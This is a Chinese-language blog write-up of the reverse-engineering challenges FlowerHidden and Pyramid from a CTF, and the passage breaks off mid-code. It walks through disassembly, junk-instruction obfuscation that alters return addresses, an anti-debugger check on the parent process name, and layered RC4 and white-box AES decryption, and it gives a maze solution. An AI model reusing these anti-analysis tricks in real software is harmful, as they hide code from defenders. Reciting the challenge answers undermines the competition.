<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>xrivendell7</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="xrivendell7">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="xrivendell7">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="xrivendell7">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="xrivendell7" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">xrivendell7</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-n1ctfjunior-re" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/11/18/n1ctfjunior-re/" class="article-date">
  <time class="dt-published" datetime="2025-11-18T03:04:13.000Z" itemprop="datePublished">2025-11-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="FlowerHidden"><a href="#FlowerHidden" class="headerlink" title="FlowerHidden"></a>FlowerHidden</h2><p>32位ida查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">_main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p</span><br><span class="line"></span><br><span class="line">argc            = dword ptr  8</span><br><span class="line">argv            = dword ptr  0Ch</span><br><span class="line">envp            = dword ptr  10h</span><br><span class="line"></span><br><span class="line">; FUNCTION CHUNK AT .text:00402460 SIZE 00000003 BYTES</span><br><span class="line"></span><br><span class="line">                push    ebp</span><br><span class="line">                mov     ebp, esp</span><br><span class="line">                push    offset sub_401020</span><br><span class="line">                push    offset sub_402850</span><br><span class="line">                push    offset sub_4012F0</span><br><span class="line">                push    offset sub_401330</span><br><span class="line">                push    offset sub_402480</span><br><span class="line">                push    offset loc_402810</span><br><span class="line">                push    offset sub_401350</span><br><span class="line">                push    offset sub_401360</span><br><span class="line">                push    offset sub_401300</span><br><span class="line">                push    offset sub_4012B0</span><br><span class="line">                push    offset sub_402890</span><br><span class="line">                push    offset loc_402FB0</span><br><span class="line">                push    offset sub_402490</span><br><span class="line">                push    offset sub_4012E0</span><br><span class="line">                push    offset sub_402840</span><br><span class="line">                push    offset sub_402450</span><br><span class="line">                push    offset sub_402430</span><br><span class="line">                push    offset sub_401340</span><br><span class="line">                push    offset sub_401050</span><br><span class="line">                push    offset sub_401040</span><br><span class="line">                push    offset sub_4028C0</span><br><span class="line">                push    offset sub_402440</span><br><span class="line">                push    offset loc_401000</span><br><span class="line">                push    offset sub_4012A0</span><br><span class="line">                push    offset sub_4028A0</span><br><span class="line">                push    offset sub_402420</span><br><span class="line">                push    offset sub_402880</span><br><span class="line">                push    offset sub_401320</span><br><span class="line">                push    offset sub_401310</span><br><span class="line">                push    offset sub_4012C0</span><br><span class="line">                push    offset sub_401030</span><br><span class="line">                push    offset sub_402860</span><br><span class="line">                push    offset sub_402410</span><br><span class="line">                push    offset sub_401010</span><br><span class="line">                push    offset sub_402830</span><br><span class="line">                push    offset sub_402820</span><br><span class="line">                push    offset sub_402870</span><br><span class="line">                push    offset sub_4012D0</span><br><span class="line">                push    offset sub_4028B0</span><br><span class="line">                push    offset loc_402460</span><br><span class="line">                retn</span><br><span class="line">_main           endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                pop     ebp</span><br><span class="line">                retn</span><br></pre></td></tr></table></figure>

<p>进入main有花指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00402FB0 loc_402FB0:                             ; DATA XREF: _main+3A↓o</span><br><span class="line">.text:00402FB0                 cmp     eax, 4</span><br><span class="line">.text:00402FB3                 jz      short locret_402FBA</span><br><span class="line">.text:00402FB5                 call    loc_402A60</span><br><span class="line">.text:00402FBA</span><br><span class="line">.text:00402FBA locret_402FBA:                          ; CODE XREF: .text:00402FB3↑j</span><br><span class="line">.text:00402FBA                 retn</span><br><span class="line">.text:00402FBA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00402FBB                 align 10h</span><br></pre></td></tr></table></figure>

<p>去看loc_402A60</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00402A7A                 mov     eax, 1</span><br><span class="line">.text:00402A7F                 imul    ecx, eax, 3</span><br><span class="line">.text:00402A82                 movsx   edx, byte_420100[ecx]</span><br><span class="line">.text:00402A89                 push    edx</span><br><span class="line">.text:00402A8A                 call    sub_4023E0</span><br></pre></td></tr></table></figure>

<p>从表 <code>byte_420100</code> 读取值，传入 <code>sub_4023E0</code>，ecx&#x3D;3，imul有符号整数乘法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data:00420100 byte_420100     db 0                    ; DATA XREF: sub_401D80+63B↑o</span><br><span class="line">.data:00420100                                         ; sub_4024A0+4F↑r ...</span><br><span class="line">.data:00420101                 db    1</span><br><span class="line">.data:00420102                 db    2</span><br><span class="line">.data:00420103                 db    3</span><br><span class="line">.data:00420104                 db    4</span><br><span class="line">.data:00420105                 db    5</span><br><span class="line">.data:00420106                 db    6</span><br><span class="line">.data:00420107                 db    7</span><br></pre></td></tr></table></figure>

<p>byte_420100取值范围0~7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:004023E0 sub_4023E0      proc near               ; CODE XREF: sub_4024A0+57↓p</span><br><span class="line">.text:004023E0                                         ; sub_4024A0+7A↓p ...</span><br><span class="line">.text:004023E0</span><br><span class="line">.text:004023E0 arg_0           = dword ptr  4</span><br><span class="line">.text:004023E0</span><br><span class="line">.text:004023E0                 mov     ebx, [esp+arg_0]</span><br><span class="line">.text:004023E4                 mov     eax, 0Ah</span><br><span class="line">.text:004023E9                 mov     ecx, ebx</span><br><span class="line">.text:004023EB                 not     eax</span><br><span class="line">.text:004023ED                 and     ebx, eax</span><br><span class="line">.text:004023EF                 not     eax</span><br><span class="line">.text:004023F1                 not     ecx</span><br><span class="line">.text:004023F3                 and     ecx, eax</span><br><span class="line">.text:004023F5                 or      ebx, ecx</span><br><span class="line">.text:004023F7                 inc     ebx</span><br><span class="line">.text:004023F8                 dec     ebx</span><br><span class="line">.text:004023F9                 mul     ebx</span><br><span class="line">.text:004023FB                 div     ebx</span><br><span class="line">.text:004023FD                 xor     ebx, eax</span><br><span class="line">.text:004023FF                 add     [esp+0], ebx</span><br><span class="line">.text:00402402                 retn    4</span><br><span class="line">.text:00402402 sub_4023E0      endp</span><br></pre></td></tr></table></figure>

<p>简化：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sub_4023E0:</span><br><span class="line">    mov     ebx, [esp+4]       ; ebx = arg</span><br><span class="line">    mov     eax, 0Ah           ; eax = 10</span><br><span class="line">    mov     ecx, ebx           ; ecx = arg</span><br><span class="line">    not     eax                ; eax = ~10</span><br><span class="line">    and     ebx, eax           ; ebx = arg &amp; ~10</span><br><span class="line">    not     eax                ; eax = 10</span><br><span class="line">    not     ecx                ; ecx = ~arg</span><br><span class="line">    and     ecx, eax           ; ecx = ~arg &amp; 10</span><br><span class="line">    or      ebx, ecx           ; ebx = (arg &amp; ~10) | (~arg &amp; 10)</span><br></pre></td></tr></table></figure>

<p><code>(arg &amp; ~mask) | (~arg &amp; mask)</code> 这个表达式是按位选择：当 <code>mask</code> 位为 1 时取原式&#x3D;<code>~arg</code> ，为 0 时原式&#x3D; <code>arg</code> 的那一位。代数上等价于 <code>arg ^ mask</code>（异或）。</p>
<p>本题mask&#x3D;0xA(10)，所以ebx&#x3D;arg^0xA。</p>
<p> inc指令用于将一个寄存器的值加1，dec指令用于将一个寄存器的值减1。</p>
<p>当前ebx&#x3D;arg^0xA，eax&#x3D;10</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mul     ebx                ; EDX:EAX = 10 * (arg^0xA)</span><br><span class="line">div     ebx                ;(10 * (arg^0xA))/(arg^0xA)</span><br><span class="line">xor     ebx, eax           ; ebx = EBX ^ 10</span><br><span class="line">add     [esp+0], ebx       ; *(DWORD*)(esp) += ebx   &lt;-- 修改返回地址</span><br><span class="line">ret     4</span><br></pre></td></tr></table></figure>

<p>div这里，如果(arg^0xA)!&#x3D;0，ebx &#x3D; (arg^0xA) ^ 10&#x3D;arg</p>
<p>到此这一长段乘除只是把 <code>ebx</code> 恢复为原始输入 <code>arg</code> ，是花指令</p>
<p>add这里，<code>esp+0</code> 是栈顶 <strong>返回地址</strong>（函数被调用时的 <code>ret</code> 地址）。因此它 <strong>把 <code>arg</code> 加到返回地址上</strong>（即修改返回地址，使得 <code>ret</code> 返回到 <code>return_address + arg</code>）。</p>
<p>[ ]取地址</p>
<table>
<thead>
<tr>
<th>平台 &#x2F; ABI</th>
<th>参数 1</th>
<th>参数 2</th>
<th>参数 3</th>
<th>参数 4</th>
<th>参数 5+</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><strong>x86 (32位, cdecl&#x2F;stdcall)</strong></td>
<td><code>[esp+4]</code></td>
<td><code>[esp+8]</code></td>
<td><code>[esp+0xC]</code></td>
<td><code>[esp+0x10]</code></td>
<td>继续往上递增</td>
<td>所有参数都压栈；<code>[esp]</code> 是返回地址</td>
</tr>
<tr>
<td><strong>Windows x64 (MSVC ABI)</strong></td>
<td><code>RCX</code></td>
<td><code>RDX</code></td>
<td><code>R8</code></td>
<td><code>R9</code></td>
<td><code>[rsp+0x28]</code> 开始</td>
<td>栈上预留 32 字节 shadow space (<code>rsp+20h</code> 到 <code>rsp+40h</code>)，即使没用</td>
</tr>
<tr>
<td><strong>System V AMD64 (Linux, macOS, BSD)</strong></td>
<td><code>RDI</code></td>
<td><code>RSI</code></td>
<td><code>RDX</code></td>
<td><code>RCX</code></td>
<td><code>R8</code></td>
<td><code>R9</code></td>
</tr>
</tbody></table>
<p>sub_402A60，两次输入，第二次输入会被switch四个方向</p>
<p>迷宫终点是38，移动42次，累加和为117</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">64  49  49  49  49  49  48  48  48  48  49   0</span><br><span class="line">48  48  48  49  48  48  48  49  49  48  49   0</span><br><span class="line">49  49  48  49  48  49  48  48  49  48  49   0</span><br><span class="line">49  49  48  48  48  49  49  48  48  48  49   0</span><br><span class="line">49  49  48  49  49  48  48  48  49  49  49   0</span><br><span class="line">49  49  48  49  49  48  49  49  49  49  49   0</span><br><span class="line">49  48  48  48  48  48  49  49  49  49  49   0</span><br><span class="line">49  48  49  49  49  48  48  49  48  48  48   0</span><br><span class="line">49  48  48  48  49  49  48  48  48  49  48   0</span><br><span class="line">49  49  49  48  49  49  48  49  49  49  48   0</span><br><span class="line">49  49  49  48  48  48  48  48  48  48  38   0</span><br><span class="line">49  49  49  49  49  49  49  49  49  49  49   0</span><br></pre></td></tr></table></figure>

<p>sddssddwwddsdssaassaaaassddssdddwwddwddsss，程序验证通过，但是不是flag。发现ipu文件还没有使用，而且第一个输入也没被使用。</p>
<p>关注迷宫的第一个输入，注意到这里是有一个指针指向第一次输入的，看这个指针的交叉引用，可以看到一个验证和分发程序。</p>
<p>sub_1D80</p>
<p>首先，读入了1pmoluy.ipu文件，经过文件名解码，文件读入与解码。然后得到 4 个指针，分别指向不同解密后函数的入口。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)dword_420FB0 = Buffer;</span><br><span class="line">qmemcpy(v16, &quot;FUNC&quot;, sizeof(v16));</span><br><span class="line"></span><br><span class="line">*(_DWORD *)(dword_420FB0 + 4) = *(_DWORD *)dword_420FB0 + sub_401AC0(*(_DWORD *)dword_420FB0, v16, v13);</span><br><span class="line"></span><br><span class="line">*(_DWORD *)(dword_420FB0 + 8) = *(_DWORD *)(dword_420FB0 + 4) + sub_401AC0(*(_DWORD *)(dword_420FB0 + 4), v16, v13);</span><br><span class="line"></span><br><span class="line">*(_DWORD *)(dword_420FB0 + 12) = *(_DWORD *)(dword_420FB0 + 8) + sub_401AC0(*(_DWORD *)(dword_420FB0 + 8), v16, v13);</span><br></pre></td></tr></table></figure>

<p>对比父进程名字的前 3 个字节。如果不匹配，<code>byte_420100[6] = 10;</code> → 改变全局控制流。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String2 = &#123; -26, -21, -18, -113 &#125;;</span><br><span class="line">for (m=0; m&lt;4; m++) String2[m] ^= 0x8F;</span><br><span class="line">_strnicmp(String1, String2, 3)</span><br></pre></td></tr></table></figure>

<p>strings2单字节异或得到字符串”ida”，如果父进程是 IDA，则会把 <code>byte_420100[6]</code> 设为 10。</p>
<p>sub_2790，异常处理函数，这里又改成了1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __usercall sub_402790@&lt;eax&gt;(int a1@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  if ( *(_DWORD *)(a1 + 0x10) == 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    ++**(_DWORD **)(a1 + 8);</span><br><span class="line">    byte_420100[6] = 1;</span><br><span class="line">    *(_DWORD *)(a1 - 28) = sub_401370;</span><br><span class="line">    dword_420FC0 = *(_DWORD *)(a1 - 28);</span><br><span class="line">    __asm &#123; retn &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_DWORD *)(a1 - 36) = 0;</span><br><span class="line">  *(_DWORD *)(a1 - 4) = -2;</span><br><span class="line">  return *(_DWORD *)(a1 - 36);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在反调试的函数中，调用了1pmoluy.ipu文件。文件中存储的是四个加密函数，经过解密后会被后面分发函数进行调用。然后根据路径进行顺序解密。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int __usercall sub_401370@&lt;eax&gt;(int a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  dword_420FB8 = a1;</span><br><span class="line">  if ( a1 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(void (__cdecl **)(char *))dword_420FB0)(off_420234);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( dword_420FB8 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 2:</span><br><span class="line">        (*(void (__cdecl **)(char *))(dword_420FB0 + 4))(off_420234);</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        (*(void (__cdecl **)(char *))(dword_420FB0 + 8))(off_420234);</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        (*(void (__cdecl **)(char *))(dword_420FB0 + 12))(off_420234);</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        return dword_420FB8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401210();</span><br><span class="line">  return dword_420FB8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加密1 异或 左循环位移 异或 右循环位移<br>加密2 固定key生成固定box和对应固定key 这里dump其实就行<br>加密3 这里把boxdump下来试两下就会发现 这里仅仅是实现了加减法<br>加密4 根据key生成随机顺序换序 也可以dump下来然后固定换回来就行</p>
<h2 id="Pyramid"><a href="#Pyramid" class="headerlink" title="Pyramid"></a>Pyramid</h2><p>chal.pyc -&gt; pyramid.pyd -&gt; a_long_way_to_treasure() -&gt;  pyramid.pyc（异或）   -&gt;  checkinput.pyd(rc4)  -&gt; 白盒aes解flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: chal.py</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.12.0rc2 (3531)</span></span><br><span class="line"><span class="comment"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyramid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">text = <span class="string">&#x27;A pyramid fortified with intricate defenses looms before you. \nIts secrets are locked behind layers of puzzles. \nYou stand at its base, challenged to unravel them all.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;･････････････････････････････････････････････････････････････････&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> text.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;  <span class="subst">&#123;line&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;･････････････････････････････････････････････････････････････････&#x27;</span>)</span><br><span class="line">pyramid.a_long_way_to_treasure()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.remove(<span class="string">&#x27;checkinput.pyd&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<style>.ufsebqwhoclc{}</style><img src="/2025/11/18/n1ctfjunior-re/1763435137247-6.png" class="ufsebqwhoclc" alt="img">

<style>.dbrgoqdbsoup{zoom:67%;}</style><img src="/2025/11/18/n1ctfjunior-re/1.png" class="dbrgoqdbsoup" alt="img">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0000000180008280 unk_180008280   db 0A9h                 ; DATA XREF: .rdata:0000000180007F80↑o</span><br><span class="line">.rdata:0000000180008281                 db  6Ch ; l</span><br><span class="line">.rdata:0000000180008282                 db  63h ; c</span><br><span class="line">.rdata:0000000180008283                 db  6Dh ; m</span><br><span class="line">.rdata:0000000180008284                 db  64h ; d</span><br><span class="line">.rdata:0000000180008285                 db  72h ; r</span><br><span class="line">.rdata:0000000180008286                 db  65h ; e</span><br><span class="line">.rdata:0000000180008287                 db  61h ; a</span><br><span class="line">.rdata:0000000180008288                 db  2Bh ; +</span><br><span class="line">.rdata:0000000180008289                 db  30h ; <span class="number">0</span></span><br><span class="line">.rdata:000000018000828A                 db 0B5h</span><br><span class="line">.rdata:000000018000828B                 db  1Bh</span><br><span class="line">.rdata:000000018000828C                 db 0BDh</span><br><span class="line">.rdata:000000018000828D                 db  0Ch</span><br><span class="line">.rdata:000000018000828E                 db  6Bh ; k</span><br><span class="line">.rdata:000000018000828F                 db  6Fh ; o</span><br><span class="line">.rdata:0000000180008290                 db  81h</span><br><span class="line">.rdata:0000000180008291                 db  61h ; a</span><br><span class="line">.rdata:0000000180008292                 db  6Eh ; n</span><br><span class="line">.rdata:0000000180008293                 db  67h ; g</span><br><span class="line">.rdata:0000000180008294                 db  64h ; d</span><br><span class="line">.rdata:0000000180008295                 db  72h ; r</span><br><span class="line">.rdata:0000000180008296                 db  65h ; e</span><br><span class="line">.rdata:0000000180008297                 db  61h ; a</span><br><span class="line">.rdata:0000000180008298                 db  6Dh ; m</span><br><span class="line">.rdata:0000000180008299                 db  69h ; i</span><br><span class="line">.rdata:000000018000829A                 db  74h ; t</span><br><span class="line">.rdata:000000018000829B                 db  73h ; s</span><br><span class="line">.rdata:000000018000829C                 db  6Dh ; m</span><br><span class="line">.rdata:000000018000829D                 db  71h ; q</span><br><span class="line">.rdata:000000018000829E                 db  67h ; g</span><br><span class="line">.rdata:000000018000829F                 db  6Fh ; o</span><br><span class="line">.rdata:00000001800082A0                 db  62h ; b</span><br><span class="line">.rdata:00000001800082A1                 db  61h ; a</span><br><span class="line">.rdata:00000001800082A2                 db  6Eh ; n</span><br><span class="line">.rdata:00000001800082A3                 db  67h ; g</span><br><span class="line">.rdata:00000001800082A4                 db  64h ; d</span><br></pre></td></tr></table></figure>

<style>.vbfjnrvgagct{zoom:80%;}</style><img src="/2025/11/18/n1ctfjunior-re/1763435137193-2.png" class="vbfjnrvgagct" alt="img">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: layer2.py</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.12.0rc2 (3531)</span></span><br><span class="line"><span class="comment"># Source timestamp: 2025-09-10 10:56:06 UTC (1757501766)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> wintypes</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BUF</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [(<span class="string">&#x27;Length&#x27;</span>, wintypes.ULONG), (<span class="string">&#x27;Unused&#x27;</span>, wintypes.ULONG), (<span class="string">&#x27;Ptr&#x27;</span>, ctypes.c_void_p)]</span><br><span class="line">key = <span class="built_in">input</span>(<span class="string">&#x27;Input your key: &#x27;</span>)</span><br><span class="line">tmp = <span class="number">2166136261</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> key:</span><br><span class="line">    tmp = <span class="number">16777619</span> * (tmp ^ <span class="built_in">ord</span>(ch)) &amp; <span class="number">4294967295</span></span><br><span class="line">key_bytes = struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, tmp)</span><br><span class="line">advapi32 = ctypes.WinDLL(<span class="string">&#x27;advapi32&#x27;</span>, use_last_error=<span class="literal">True</span>)</span><br><span class="line">SystemFunction033 = advapi32.SystemFunction033</span><br><span class="line">FNPROTO = ctypes.WINFUNCTYPE(<span class="literal">None</span>, ctypes.POINTER(BUF), 